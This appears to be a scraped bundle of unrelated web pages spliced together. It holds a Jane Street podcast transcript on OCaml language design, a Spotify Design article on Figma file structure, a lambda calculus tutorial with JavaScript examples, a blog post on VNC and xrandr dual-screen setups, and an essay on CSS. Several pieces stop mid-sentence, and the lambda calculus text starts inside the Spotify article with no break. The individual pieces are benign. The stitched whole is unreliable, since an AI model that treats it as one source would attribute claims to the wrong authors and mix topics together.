<div><p>Welcome to Signals And Threads, in-depth conversations about every layer of the tech stack from Jane Street. I’m Ron Minsky. </p><p> Today, we’re going to have a conversation about programming language design with Leo White. Leo works in our compilers team here at Jane Street, and he works mostly on what’s called the frontend of the compiler, which means he spends a lot of time thinking about language features and about the type system that supports those language features, and in particular, he does that work in OCaml, which is the programming language we use on a day-to-day basis. </p><p> So, Leo, to get started, I’m curious, can you tell us a little bit about how you got involved in all of this? How you got involved in programming language design, in the first place?</p></div>

<h2 id="0000400">00:00:40.0</h2>

<div><p>I had some interest in programming languages from a young age. I started programming at 11 or something, and then I think I was fairly interested in how these mysterious things were created. The most formative thing I can think of in this regard, is between my first and second years at university, I remember reading Benjamin Pierce’s <a href="https://www.cis.upenn.edu/~bcpierce/tapl/"><em>Types and Programming Languages</em></a>. That really clicked. I just thought that stuff was great and I just really wanted work on it, and explore those ideas. </p><p> So, I think that’s kind of one of the main things that got me into it. I knew I wanted to do some programming language stuff, I started doing a PhD in that area. It was more about compilation than programming language design, and I was working on a source-to-source C compiler, and I was writing that compiler in OCaml, because OCaml had a good library for reading C files, and I already knew Standard ML, because it’s what they teach you in the first year at Cambridge. So, anyways, I was using OCaml to write this compiler, and I realized that there was a language feature that I wanted to have that would make it easier for me to write this C compiler, and since I kind of hated the work I was doing on the C compiler and was not that interested in it, I procrastinated by adding this feature to OCaml instead. And that’s kind of how I got into writing code for the OCaml compiler. So, I was writing, this language feature and went through the process of trying to upstream it, and whilst I was doing that and my PhD was coming to an end, Anil Madhavapeddy was looking around for people to join OCaml Labs, which was this new project to work on the OCaml compiler that Jane Street was kind of funding in Cambridge. So, he was trying to look for people to work on the OCaml compiler and suddenly this Cambridge address shows up with the implementing language features for OCaml and so he thought, well, I should go and see this person. So, he got in touch with me. And that’s kind of how I started working at OCaml Labs as an RA after having finished my PhD.</p></div>

<h2 id="0002195">00:02:19.5</h2>

<p>It’s by the way worth noting that most people have the wisdom to not immediately go and dive into adding features to languages that they’re just starting to use, and in particular, diving into the type system. I think when Anil saw someone who was willing to just going in and add a new type system feature, he was pretty excited.</p>

<h2 id="0002346">00:02:34.6</h2>

<p>Yes. I did not realize at the time that this wasn’t something that you just did. Yes, I was somewhat under-supervised in my PhD and clearly, no one told me that this is a terrible idea, and a bad way to spend your time. So, I just went ahead and did it instead, and I really enjoyed it. I mean, it’s quite a terrible…like, the type system is hard to dive into. I would not recommend doing it without some assistance.</p>

<h2 id="0002568">00:02:56.8</h2>

<p>The thing you mentioned about how you got involved in OCaml, is the thing that’s always worried me a little bit about how languages are designed, which is to say, languages are almost inevitably designed by people who write compilers, and so, they go around and look at the features they would like for writing compilers and go ahead and add them to the language, and I always wondered, like, how much of a bias is this in how our languages are designed?</p>

<h2 id="0003178">00:03:17.8</h2>

<p>I would say, not much of one mostly, because that is probably a fair accusation of OCaml, which is very nice for writing compilers and has all the things you would want for writing a compiler, but that is not true of most languages. Most languages are kind of horrible to write compilers in, so I don’t think it’s applying there.</p>

<h2 id="0003327">00:03:32.7</h2>

<p>So, you got excited about programming language design from reading <em>Types and Programming Languages</em>, which is Benjamin Pierce’s extremely famous book in this area, or at least extremely famous in an extremely narrow group of people, and you’ve been doing it now for quite a while. Some of that work during your PhD. Some at OCaml Labs, and a bunch of it here, in the intermediate time. What do you find exciting about language design? Why do you like it?</p>

<h2 id="0003550">00:03:55.0</h2>

<p>One of the main things I think I like about language design is that it sits at an interesting intersection between some very interesting pure mathematics, especially on the type system design side of things, and a more aesthetic, kind of, design style. A lot of it is about trying to find things that fit within the mathematical constraints, but are also a design that people like aesthetically and enjoy using.</p>

<h2 id="0004166">00:04:16.6</h2>

<p>And this is one of the real challenges of programming language design. It is really not, at its heart, a scientific enterprise, or at least, not at the end. This is a thing you often hear programming language people complain about, is the fact that they can’t do any proper studies, or rather, whether they can or can’t do it, that in practice, that is not how the field is driven.</p>

<h2 id="0004365">00:04:36.5</h2>

<p>Some people do try and do studies in how effective a programming language is, but it kind of hits up against all the things that make it hard to do experiments in the social sciences. It’s just seems like, in principle, you can manage it, but the experiments are just very hard to do, right? What you really need to do is get a load of professional programmers to agree to use all these different languages to solve the same problems for a prolonged period of time, and clearly this isn’t going to happen.</p>

<h2 id="0004566">00:04:56.6</h2>

<p>Yeah, it does seem completely and utterly hopeless to me because, if the things you care about are what you can do in a programming language, with large groups of people, solving hard problems, with significant amounts of time being devoted to it, which seems like, to me, at least, the interesting problem, and I think, a problem that a lot of programming languages are not even motivated by, you just have no hope. Like the kind of experiments people can run in practice, are like, they grab the thing they have at hand, which is usually a collection of sophomores, and then they study the thing that they can, which is something like how easy is it to understand the very first errors they see in their language or like, how well do they do when they try and do stuff in their first few weeks or maybe few months of working at it. And that just doesn’t get at the actual thing you care about when you think about what makes programming effective in the real world.</p>

<h2 id="0005434">00:05:43.4</h2>

<div><p>This kind of genuinely bothers quite a lot of people, I think, who work in programming languages. They really would much prefer that it were a proper science. It’s much better thought of as a kind of intersection between some mathematics and design. </p><p> And those are both things that we know how to study, right? The scientific method is not the only approach to knowledge. With mathematics, you can try to prove useful theorems and interesting properties, and people successfully do research in design disciplines like, my favorite example is really architecture, which I think is a very similar area to programming language design, in that it’s kind of constrained by mathematics. You know, you have to make sure the building stays up and also, is interesting from a design perspective. You know, you want to make buildings that people enjoy being in and looking at, and so on.</p></div>

<h2 id="0006249">00:06:24.9</h2>

<p>And there’s more than just the raw structural things you have to check. When you think about the design of a building, you think about what are transit times, and people do all sorts of studies to try get feels for how effective it is, but in the end, no one thinks that the final way to figure out whether a building is good is to do a randomized control trial, where you’re like, you make four different buildings and you have this, this and this. You have four equivalent businesses that you sit in the four different buildings and you see how it goes. And I think the scale of the economic investment required, I’m not sure if it’s not quite as absurd or a little more absurd to do the programming language equivalent, but it’s up there.</p>

<h2 id="0007013">00:07:01.3</h2>

<p>I think that that’s a better way of looking at programming language design, as a discipline.</p>

<h2 id="0007068">00:07:06.8</h2>

<p>You know, there are two ways of handling design problems. One is, you can solve them in the market, right? You can, you know, go off and have people go and design programming languages and see which are successful, and we have that down. There’s a whole system for doing that. And then there’s an academic equivalent of this, and a lot of the work on OCaml, in particular, happens in a context which includes a lot of academic stuff. Do you have a feel for how you would make things like evaluation of papers different than it is now in order to accommodate for this?</p>

<h2 id="0007335">00:07:33.5</h2>

<div><p>I don’t have concrete suggestions. I’ve always wanted to, actually seriously, look into disciplines like architecture and so on, and look at how they, I mean they have journals. They have assessment of things. There must be mechanisms by which they do this, but I’ve never actually sat down and put serious time into seeing what that is. </p><p> I’m kind of more struck by the fact that when you’re at, say ICFP, which is the main functional …</p></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Spotify Design recently migrated to Figma. We're excited to open up the music box and describe how we've shaped the tool to suit our needs and culture at Spotify. But in this article, we're not discussing why or how we moved. Instead, this is where we're going to geek out over file structures.</p><div><p>Check out our Figma Ways of Working above, and have a read of this article to understand some of the rationale behind it. We hope this information will be useful for other design teams seeking more organisation for their work in Figma.</p><h3>Defining our goal</h3><p>At Spotify Design, we actively encourage everyone to explore problems together, get inspired by one another and find harmony across design solutions. So as we were planning the migration, we set a goal to boost this effort and guide us through the whole process: <strong>organise our work in ways that improve collaboration between designers.</strong> New tools such as Abstract and Figma offer the ability to work together like never before, but allowing multiple people into the same file doesn’t automatically lead to better collaboration. Our files would need to be organised in a way that is visible and discoverable by everyone. After all, you can’t collaborate on work that you can’t find.</p><p>This is especially true in organisations like Spotify. Our squad model is optimised for autonomy, which is beneficial for many reasons but can result in designers working in isolation. Not only are we spread out amongst cross-functional squads, but we’re also spread across multiple product areas—which we call “business units”—and numerous offices around the world.</p><h3>New process, new challenges&nbsp;</h3><p>In our pursuit of greater visibility of work, we needed to be mindful of how we impacted speed and effort—two important factors in a designer’s workflow. Increasing visibility can be detrimental as it introduces more people, more structure, more rules, and more thinking to simple tasks. Our decisions could easily increase the effort required to keep work organised or make it slower to navigate to files, potentially resulting in fewer sketches, prototypes, and iterations. The challenge was to balance our need for both visibility and speed.</p></div><div><p>Previous attempts at storing our design files helped us understand how the migration might play out if we weren’t thoughtful enough. Some of the things we anticipated when designing the Figma workflow were:</p><ul><li><p><strong>People naturally optimise for speed</strong>, creating personal workflows and carving out private spaces for themselves or their squad. While standards can improve speed in the long run, individual workflows seem more immediately beneficial.&nbsp;</p></li><li><p><strong>People interpret structure in their own way</strong> using various mental models—teams, products, projects, people—and standards rarely develop organically. Guidelines have to be clear and intuitive to break through individual instincts.&nbsp;</p></li><li><p>While some people iterate on features and document specs within the same file, others separate them into different documents. <strong>Seemingly small decisions flow into processes with engineers and PMs and define their understanding of how to find work</strong>.</p></li></ul><p>We had to take every detail of these behaviours into consideration before moving forward.</p><h3>Ways of working&nbsp;</h3><p>So we had a goal, and we knew the challenges that lay ahead, but how did we tackle the problem? Design Ops used our <a href="https://spotify.design/articles/2019-10-17/dialling-up-the-joy-turning-down-the-pain-design-ops-at-spotify/" rel="noopener noreferrer" target="_blank"><u>trusted working group (WG) model</u></a> and pulled together a crew of designers from across Spotify that were able to represent the design teams in their business units.</p><p>To start, the group defined a set of principles that reflected our objectives and would guide our ideas:</p><ul><li><p><strong>Unifying:</strong> People should be organically exposed to other relevant work, regardless of where they sit in the org.</p></li><li><p><strong>Discoverable: </strong>Work should have a clear home. There should be no lingo, no hunting for files, and no getting lost.</p></li><li><p><strong>Manageable:</strong> Spaces shouldn’t become so busy that files aren’t easy to organise and access.</p></li><li><p><strong>Sustainable:</strong> The number of teams and projects shouldn’t grow to an untenable size, become irrelevant, or need to be frequently changed.</p></li><li><p><strong>Autonomous:</strong> Each team should be empowered to diverge from our recommendations, acknowledging that one solution may not work for everyone.</p></li></ul><p>From there, we explored a spectrum of options that aimed to balance visibility and speed. Some increased the size of spaces where more people would work alongside each other, while others narrowed them down to smaller definitions with just a couple of designers working side-by-side. With a set of options, a stack of printouts, and even Figma prototypes, we conducted rounds of research with designers in our business units. Yes, we got <i>that </i>nerdy. We had file structure design workshops!&nbsp;</p><p>Here’s an example of some of the workshop material:</p></div><div><p>The workshops allowed us to identify the most common mental models, test the intuitiveness of our ideas and give everyone a voice. Perhaps most importantly, it gave the design team some empathy for the problem we were trying to solve. We can be passionate about our personal workflows (we use them every day!) so sharing the problem with the team helped them recognise how differently everyone can think about these things.</p><h3>The outcome</h3><p>This process led us to the following three key decisions:</p><ol><li><p><strong>Teams </strong>will be organised by the products we build.&nbsp;</p></li><li><p><strong>Projects</strong> will be organised by a product’s features or feature sets.&nbsp;</p></li><li><p><strong>Specs</strong> will be centralised inside a single project in each team. </p></li></ol></div><div><p>Organising <strong>Teams</strong> in this way communicates our expansive product suite at Spotify such as our mobile app, Spotify Kids, Ad Studio, Spotify for Artists, Anchor, and many other external and internal products. From our org overview you can immediately tell that design work from the whole company is right at your fingertips. The structure guides designers from different business units and squads to work together in the same space when designing for the same product, and it enables us to cleanly map our <a href="https://spotify.design/articles/2019-12-16/reimagining-design-systems-at-spotify/" rel="noopener noreferrer" target="_blank">Encore (design system)</a> libraries to each team.</p><p>These same attributes are reflected in the Team structure where a product's set of features are communicated through <strong>Projects</strong>. Emojis help us distinguish between specs, feature explorations, new initiatives, and a playground for quick ideas, and each Project is usually filled with work from only three or four designers so people still have a sense of their own, personal space.</p><p>Lastly, we took the opportunity to reconsider how and where we document our <strong>specs</strong>—the screens, states, and flows that represent our source of truth. Our decision didn’t immediately feel intuitive to the design team, but we held a strong conviction that its value would soon become apparent.</p></div><div><p>“Where’s the latest design?” is a message we send and receive far too often. Similar to how we’re bringing visibility to exploration work through our new Team and Project structures, we also wanted to pull specs out from individual files and into the open. Each Team (i.e. product) now has a single spec file, and within those files are pages that represent each of our features. As a designer hones in on a solution, they move their work into these centralised specs to document their decisions.&nbsp;</p><p>Like the software we ship, these specs constantly evolve as old screens replace new ones, and components update to take on new forms and functionality. It’s a representation that we are all working together towards a unified product, sharing patterns and solutions with each other. And there is no "looking at the wrong thing," because there is only one place to look.</p><h3>Where it all comes together&nbsp;</h3><p>Finally, the WG developed a <a href="https://www.figma.com/community/file/832911648132248625/Spotify-Ways-of-Working" rel="noopener noreferrer" target="_blank">playbook</a> and incorporated this into the training we hosted when we onboarded designers onto Figma. The WG needed to do some polite policing, regularly checking the tool to do some light housekeeping—checking on rogue teams (often with random squad names), pinging people on Slack when we saw diversions to the conventions, and hosting demos to show people how to set up things correctly. We created a #figma channel for designers to ask us questions and even added some external folk from the Figma product team.</p></div><div><p>We have now been using the new structure for three months and so far, so good. For the most part, designers have adhered to the system, and we have seen instances of teams across the organisation collaborating on products, rather than hiding their work inside their orgs. We believe this will have the impact we set out to achieve, and we’ll continue to iterate as we receive feedback and notice emerging trends.</p><p>If you're going through the process of creating your own organisation system, remember to use your design team’s superpowers to help guide your structure—research how your own team works, test ideas with designers, and prototype solutions before agreeing on a structure that works for your team culture.&nbsp;</p><p>—

    <p>I have recently become very interested in functional programming - using pure functional languages such as Haskell, as well as functional programming in JavaScript. One of the main areas of study that is often cited as significant for functional programmers is <strong>lambda calculus</strong>.</p>

<p>In this article I want to look at what lambda calculus is, why you might want to learn about it, and explain the key concepts and the terminology of lambda calculus using both lambda syntax and ‘equivalent’ JavaScript code snippets.</p>

<p>If after reading this you are interested in learning more about functional programming in JavaScript, I recommend this Udemy course (affiliate link):</p>

<p><a href="https://click.linksynergy.com/link?id=5FPU6FRy5w4&amp;offerid=507388.1537962&amp;type=2&amp;murl=https%3A%2F%2Fwww.udemy.com%2Fcourse%2Ffunctional-programming-for-beginners-with-javascript%2F">Functional Programming For Beginners With JavaScript</a></p>



<p>There are a few reasons to learn lambda calculus, the main ones I can think of are:</p>

<ol>
  <li>
    <p><strong>It embodies some of the most important concepts of functional programming</strong></p>

    <p>For example, pure functions, unary functions, currying.</p>
  </li>
  <li>
    <p><strong>The internals of many functional programming languages such as Haskell, are heavily based on lambda calculus</strong></p>

    <p>Understanding lambda calculus will help you to understand these languages.</p>
  </li>
  <li>
    <p><strong>Many concepts from lambda calculus are applicable to general purpose languages such as JavaScript.</strong></p>

    <p>Concepts such as pure functions, unary functions and currying are used in many general purpose programming languages, and are often used in functional JavaScript.</p>
  </li>
  <li>
    <p><strong>It is interesting</strong></p>

    <p>Lambda calculus is an interesting area of mathematics, and is relatively accessible to those with a minimal maths background.</p>
  </li>
</ol>



<p>Lambda calculus was invented by the mathematician <a href="https://en.wikipedia.org/wiki/Alonzo_Church">Alonzo Church</a> in the 1930s, and is what is known as a ‘computational model’. By that, I mean that it is a system which can be used to encode and compute algorithmic problems.</p>

<p>The computational model most of us are familiar with is the Turing machine. While lambda calculus is rather different to the Turing machine in its approach to computation, the two are formally equivalent - ie. any problem that can by solved using a Turing machine can be solved using lambda calculus, and vice versa.</p>

<p>That is to say, lambda calculus can be used to solve any problem that can be computed using a Turing machine (so anything that anyone has ever programmed with a computer)!</p>
<h2 id="lambda-calculus-basics">Lambda calculus basics</h2>

<p>Lambda calculus is very minimalistic in its rules/axioms. It is made up of just 3 basic components, or <strong>lambda terms</strong>:</p>

<ol>
  <li>
    <p><strong>Variable</strong> - a named token used in a function, which will be replaced by concrete arguments when the function is applied.</p>
  </li>
  <li>
    <p><strong>Abstraction</strong> - a function, made up of a head and a body separated by a ‘\(.\)’</p>

    <ul>
      <li>The head is a lambda followed by a variable name.</li>
      <li>The body is an expression.</li>
    </ul>
  </li>
  <li>
    <p><strong>Application</strong> - a function invokation.</p>

<p>An <strong>expression</strong> is a variable, an abstraction, an application, or any combination of these.</p>

<p>In addition, parentheses are used in lambda calculus to indicate the order of evaluation.</p>

<p>This is all we get in lambda calculus! It is quite amazing that using these 3 lambda terms we calculate pretty much anything!</p>

<p>It is worth noting the absence of any of the constructs of basic arithmetic, such as numbers, addition, subtraction, multiplication, division etc - these are not within the basic axioms of lambda calculus.</p>

<p>Numbers and arithmetic operations can be defined in terms of lambda calculus via <a href="https://en.wikipedia.org/wiki/Church_encoding">Church Encoding</a> (which is outside the scope of this article). Rather than working from first principles every time we need them, we can choose to use numbers and basic arithmetic operators for convenience.</p>

<h2 id="a-simple-example---the-identity-function">A simple example - the identity function</h2>

<p>The following function is known as the identity function, it takes a value and returns that same value.</p>

<p>In JavaScript we can easily define and execute this function:</p>

<pre><code>const identity = x =&gt; x;
identity(3) // 3
</code></pre>

<p>We can write the same function using lambda calculus as follows:</p><p>

\[\lambda x . x\]

</p><p>In the above:</p>
<ul>
  <li>\(x\) is a variable.</li>
  <li>
    <p>\(\lambda x . x\) is an abstraction.</p>

    <ul>
      <li>\(\lambda x\) is the head of the abstraction</li>
      <li>\(x\) is the body of the abstraction.</li>
    </ul>
  </li>
</ul>

<p>To perform an application, ie. apply the function to a concrete argument, we use the following syntax:</p><p>

\[(\lambda x . x) \ 3\]

\[[x := 3]\]

\[3\]

</p><p>In the above, the \([x := 3]\) syntax indicates that we are going to substitute all instances of \(x\) in the function with \(3\). The above process is known as beta reduction, which I will talk more about now.</p>

<h2 id="beta-reduction">Beta reduction</h2>

<p>In JavaScript when we invoke a (pure) function with its arguments, the function gets evaluated and it returns the evaluated result:</p>

<pre><code>const f = (x, y) =&gt; x(y);

f(z =&gt; z + 1, 3); // 4
</code></pre>

<p>Here, <code>f</code> takes 2 arguments - a function <code>x</code> and a value <code>y</code>, and calls <code>x</code> with <code>y</code> as an argument.</p>

<p>In lambda calculus, the process of applying concrete arguments to an abstraction, and reducing the resulting expression is known as <strong>beta reduction</strong>.</p>

<p>The equivalent to the above JavaScript function <code>f</code>, when written with lambda calculus, is:</p><p>

\[\lambda x y . x y\]

</p><p>This time, we have an application in the body of the abstraction: \(x y\), this means ‘call \(x\) with \(y\) as an argument’. We can pass arguments to the abstraction and beta reduce it as follows:</p><p>

\[(\lambda x y . x y) \ (\lambda z . z + 1) \ 3\]

\[[x := \lambda z . z + 1]\]

\[(\lambda y . (\lambda z . z + 1) \ y) \ 3\]

\[[z := y]\]

\[(\lambda y . y + 1) \ 3\]

\[[y := 3]\]

\[4\]

</p><p><strong>Beta normal form</strong> is the most simplified form of an expression, ie. when it cannot be beta reduced the terms in an expression any further. In the above example \(4\) is the beta normal form of the application.</p>

<h2 id="alpha-equivalence">Alpha Equivalence</h2>

<p>In JavaScript, renaming a function’s parameters has no effect on the behaviour of the function.</p>

<pre><code>// The following are equivalent.
const myFunc1 = (x, y) =&gt; x * x;
const myFunc2 = (y, x) =&gt; y * y;
</code></pre>

<p>Similarly, in lambda calculus renaming variables within a function also has no effect. We say that abstractions which differ only in their variable names are <strong>alpha equivalent</strong>.</p>

<p>The following is an example of 2 abstractions which are alpha equivalent:</p><p>

\[\lambda x y . xx\]

\[\lambda y x . yy\]

</p><h2 id="bound-and-free-variables">Bound and free variables</h2>

<p>In JavaScript, the return value of a function can be calculated us both its parameters, and variables which the function closes over:</p>

<pre><code>const z = 5;
// z, in the context of our function, is a free variable.
const f = (x, y) =&gt; z + (x * y);

f(2, 3); // 11 === z + 6
</code></pre>

<p>Similarly, lambda calculus abstractions can make use of both variables which are defined in the head of the abstraction, and other, ‘unknown’ variables which are not. In lambda calculus:</p>

<ul>
  <li><strong>Bound variables</strong> are variables used in an abstraction which appear in the head of the abstraction.</li>
  <li><strong>Free variables</strong> are variables used in an abstraction which do not appear in the head, their value is taken to be unknown within the context of the abstraction.</li>
</ul>

<p>If we express the JavaScript function defined above in lambda calculus, we get:</p><p>

\[\lambda x y . z + (x * y)\]

</p><p>And now applying arguments to this function and beta reducing it:</p><p>

\[(\lambda x y . z + (x * y)) \ 2 \ 3\]

\[[x := 2]\]

\[(\lambda y . z + (2 * y)) \ 3\]

\[[y := 3]\]

\[z + 6\]

</p><p>The notable difference here is that in our JavaScript function, we assigned a value to <code>z</code>, whereas in the lambda calculus, we just evaluated the function as far as we could without knowing \(z\).</p>

<p>Even though it is not a numerical result, \(z + 6\) is the beta normal form of this application.</p>

<h2 id="unary-functions-and-currying">Unary functions and currying</h2>

<p>Up until now we have been making a simplification, and viewing lambda functions as functions which take one or more arguments and return a single value.</p>

<p>This is <em>not actually correct</em>.</p>

<p>Every lambda function takes a single argument and returns a single result, and this type of function is know as a <strong>unary function</strong>.</p><p>

\[\lambda x y z . x * y * z\]

</p><p>Is actually shorthand for</p><p>

\[\lambda x . (\lambda y .  (\lambda z . x * y * z))\]

</p><p>This is function with a single parameter \(x\), which when invoked returns another function with a single parameter \(y\), which when invoked returns another function with a single parameter \(z\), which when invoked returns the value of \(x * y * z\)</p>

<p>In JavaScript, the above function looks like:</p>

<pre><code>const f = x =&gt; y =&gt; z =&gt; x * y * z;
</code></pre>

<p>If you have done any functional programming in JavaScript then this way of writing a function may look familiar. Taking a function which takes many arguments, and breaking it down into a series of unary functions (which each take a single argument) is known as <strong>currying</strong>.</p>

<p>We can invoke the above function either by passing all of its arguments and immediately obtaining the final result, or, we can first create a more specific function by passing only some arguments, and then call this function later to get the final result.</p>

<pre><code>// Call our function with 3 arguments.
f(2)(3)(4); // 24

// Call our function with 2 arguments to create a more specialised function.
const multiplyBySix = f(2)(3);

multiplyBySix(4); // 24
</code></pre>

<p>In JavaScript we have the choice to either use curried unary functions, or functions which take more than one argument.</p>

<p>In lambda calculus, all functions are curried unary functions, despite that fact that we often use the aforementioned shorthand which makes them appear as if they take multiple arguments.</p>



<p>Just as not all JavaScript function calls can be evaluated to produce a value, not all lambda functions reduce to a beta normal form upon application. Consider the following, somewhat contrived piece of JavaScript:</p>

<pre><code>const f = x =&gt; x(x);
f(f);
</code></pre>

<p>This is a little confusing. We define a function <code>f</code>, which takes a function <code>x</code> and calls it with itself as an argument. On the next line, we call <code>f</code> with itself, which will recursively continue to call f with itself, and mayhem ensues.</p>

<p>If you execute the above code, you will get a max call stack size exceeded error. Conceptually we can think of what happens as something like:</p>

<pre><code>f(f(f(f(f(f(...)))))); // and so on, until we reach the maximum call stack size.
</code></pre>

<p>In lambda …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><blockquote><p>Dual screen workflows without screens across operating systems</p></blockquote><h2 id="background">Background</h2><p>My X380 sadly has been having port issues. This meant that my M14 was no longer a viable option for my second screen needs.</p><h2 id="outline">Outline</h2><p>The general form of the solution works in one of two ways:</p><dl><dt>VNC Viewer</dt><dd>Where the (second-screen) laptop connects to a VNC server on the primary laptop</dd><dt>Peripheral Shares</dt><dd>Where the secondary laptop runs a server to enable proxying mouse and keyboard access from the primary laptop</dd></dl><h2 id="vnc-and-windows">VNC and Windows</h2><p>For laptops running Windows, I personally just set up <a href="https://tightvnc.com/">TightVNC</a>. The standard settings work well enough for the peripheral share described below.</p><p>This is best used for working with Windows only stuff like Office.</p><h2 id="vnc-and-linux">VNC and Linux</h2><p>For the secondary laptop we need to run a server (<code>tigervnc</code>) without setting an external screen.</p><div><pre><code data-lang="bash">x0vncserver -rfbauth ~/.vnc/passwd
</code></pre></div><p>Now on the main laptop, we will simply leverage <code>x2vnc</code> to extend into the secondary laptop.</p><p>Where we can get the IP (local) by checking with <code>ifconfig</code> on the secondary laptop.</p><h4 id="meta">Meta</h4><p>This works best when combined with a networked file-system, since then you can interact with files in tandem. Otherwise, there is quite a bit of <code>git</code> based back and forth.</p><h2 id="vnc-and-android">VNC and Android</h2><p>There are two parts to this solution. Note that, as Android devices don’t run X11 systems in a meaningful way, the direct access method is through a paid application, a2vnc server lite, which also did not work well in my tests. We will therefore focus on setting a VNC viewer up to connect to the primary laptop.</p><h3 id="primary-settings">Primary Settings</h3><h4 id="xrandr-setup">XRandR Setup</h4><p>For the primary laptop, we will start by obtaining our present screens configuration.</p><div><pre><code data-lang="bash">xrandr <span>|</span> grep <span>" connected"</span>
</code></pre></div><div><pre><code data-lang="bash">eDP1 connected primary 1920x1080+1920+0 <span>(</span>normal left inverted right x axis y axis<span>)</span> 290mm x 170mm
</code></pre></div><p>Naturally your output will differ. We also need the resolution of the Android device. In my case, they are the same. At this point we are ready to figure out the mode-line.</p><div><pre><code data-lang="bash"><span># 1920x1080 @ 60.00 Hz (GTF) hsync: 67.08 kHz; pclk: 172.80 MHz</span>
Modeline <span>"1920x1080_60.00"</span>  172.80  <span>1920</span> <span>2040</span> <span>2248</span> <span>2576</span>  <span>1080</span> <span>1081</span> <span>1084</span> <span>1118</span>  -HSync +Vsync
</code></pre></div><p>Let us now use this information to create a bunch of modelines.</p><div><pre><code data-lang="bash">xrandr --newmode <span>"1920x1080_60.00"</span>  172.80  <span>1920</span> <span>2040</span> <span>2248</span> <span>2576</span>  <span>1080</span> <span>1081</span> <span>1084</span> <span>1118</span>  -HSync +Vsync
</code></pre></div><p>Note that we can create more of these in the same manner. We can now move forward with making a virtual screen.</p><div><pre><code data-lang="bash">xrandr --addmode VIRTUAL1 1920x1080_60.00
</code></pre></div><p>We can now finally set up the output.</p><div><pre><code data-lang="bash">xrandr --output VIRTUAL1 --mode 1920x1080_60.00 --left-of eDP1
</code></pre></div><p>Note that it is better to use <code>mons</code> to work with our newly created virtual screen.</p><p>This is still a bit ugly, since the process needs to be repeated with each reboot.</p><h4 id="vnc-setup">VNC Setup</h4><p>Now we need prepare our VNC. <code>x11vnc</code> is recommended at the moment.</p><div><pre><code data-lang="bash">x11vnc -vencrypt nodh:only-ssl -ssl SAVE -clip 1920x1080+0+0
</code></pre></div><h3 id="android-settings">Android Settings</h3><p>For this section, I personally use <a href="https://play.google.com/store/apps/details?id=com.iiordanov.bVNC&amp;hl=en&amp;gl=US">bVNC Pro</a>. The setup is pretty dead simple. A basic VNC connection is all that is required.</p><p>In practice, I use the x86 setup, with the secondary laptop acting as a viewer for a virtual screen, mostly because that way I can tune into multiple Zoom meetings (a bonus).</p><h2 id="conclusion">Conclusion</h2><p>The final setup is quite robust to changes. Future posts might go into setting up the kind of local networking tools to help move files, code and more between both machines, to improve on the peripheral share approach. Additionally, there are still some manual steps which can and should be automated. I’m not super pleased with the setup, it takes longer than a wireless sceen</p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>The key reason why you (and likely most developers) struggle with CSS, is that you underestimate it.</p><p>Underestimating CSS leads to a strange feeling of tediousness when writing it, which makes having to deal with it a laborious and seemingly unrewarding task. Style by style, div by div, media query by media query. Having to make endless small tweaks in what feels like an open-ended ‘design’ process with no direction at all can feel like torture to a development-oriented mind.</p><p>Not to mention a complete lack of debugging tools and methods available for when things go wrong.</p><p>This underestimation is a subset of a problem that we developers tend to have with design in general. In short, we don’t think it’s that important. We don’t understand or appreciate its <em>meaning</em>.</p><p>In reality, CSS is as complicated, maybe more so, as any programming language or framework you will ever come across.</p><p>But the general feeling that it is an afterthought within the development process overall, only adds fuel to fire of the thought that leads you to feel that it is tedious.</p><p>The best way to start to get better at it then, is to gain a new appreciation for it, as a 'hard', technical thing. Which it is.</p><p><strong>You do this by reframing how you see it.</strong></p><p>You can start to learn to like CSS by understanding it from a problem solving technical aspect. As an act of 'constructing' a page rather than 'designing' it. By <a target="_blank" title="https://simpleprogrammer.com/information-architecture-developers-learning-design/" href="https://simpleprogrammer.com/information-architecture-developers-learning-design/">engaging the engineering side of your mind</a>.</p><p>Instead of seeing CSS as an annoying way to 'style' pages, see it instead as a visual programming language for constructing visual guides (UI's) for your user.</p><p>You don't 'style' pages, you 'construct' and 'architect' them. It sounds weird to use these words, but they have a massive effect on changing your perception of what you're doing. And that has a massive effect on your impression and willingness to learn how to do it well.</p><p>Essentially, you can properly learn CSS by transforming it in your mind from a 'styling' problem thing, to an 'engineering' problem thing.</p><p>This defeats the feeling of tedium that your mind has when you’re dealing with CSS, and over time, if applied with some of the specific additional tactics that I will explain below, leads to actually _enjoying_ the process of writing CSS.</p><h2>Tactics That Reduce CSS Tediousness &amp; Lead To CSS Enjoyment</h2><p>Once you’ve started to reframe the act of utilizing CSS in your mind, and start to see it as more of a tool for an engineering problem rather than a ‘design’ problem, embers of enjoyment will start to emerge within you as you are writing your CSS. From here, you can start to add some fuel to the growing fire. </p><p>You can do this by utilizing some strategies, tools and techniques that further reduce the tediousness of CSS. </p><p><strong>Let’s go through them.</strong></p><h3>Use tediousness reducing tools, such as <a target="_blank" title="https://tailwindcss.com/" href="https://tailwindcss.com/">TailwindCSS</a>. So you can abstract CSS.</h3><p>I remember back a few years ago when the <a target="_blank" title="https://laravel.com/" href="https://laravel.com/">Laravel Framework</a> came out. PHP Programmers all over the web were fawning over it. The most common phrase I heard was that it gave programmers “their enjoyment of programming” back. This with a language that was notoriously derided as one that was tedious to use.</p><p>What Laravel did was abstract a lot of the annoying parts of most of these developers' workflows when writing PHP code. These developers, at this newfound higher level of abstraction, could now focus on ‘crafting’ their applications, becoming ‘artisans’ of their code rather than simply PHP programmers.</p><p>TailwindCSS does the same thing for CSS. Instead of moving from one file to another to define your styles, Tailwind uses standard default class presets that allow you to write your CSS, essentially directly onto your HTML elements. This <a target="_blank" title="https://news.ycombinator.com/item?id=24034619" href="https://news.ycombinator.com/item?id=24034619">might sound weird</a> at first, but in the end, actually results in a LOT of saved time in development.</p><p>Over time, it, along with other tools, such as Flexbox, also massively increases enjoyment, as you start to intuitively ‘craft’ and construct pages at a higher level of abstraction, rather than simply ‘style’ them.</p><p><strong>Fun fact</strong><strong>:</strong> The creator of TailwindCSS, <a target="_blank" title="https://twitter.com/adamwathan" href="https://twitter.com/adamwathan">Adam Wathan</a> actually started out as a Laravel Developer, so maybe that enthusiasm crossed over to his other project areas.</p><p><strong>EDIT</strong><strong>:</strong> I recently came across a very nice feature in Firefox that helps in debugging overflow issues (one of the most common CSS problems). You can see it in action <a target="_blank" title="https://twitter.com/violasong/status/1314406711696912386" href="https://twitter.com/violasong/status/1314406711696912386">here</a>.</p><h3>Understand how to solve common problems in 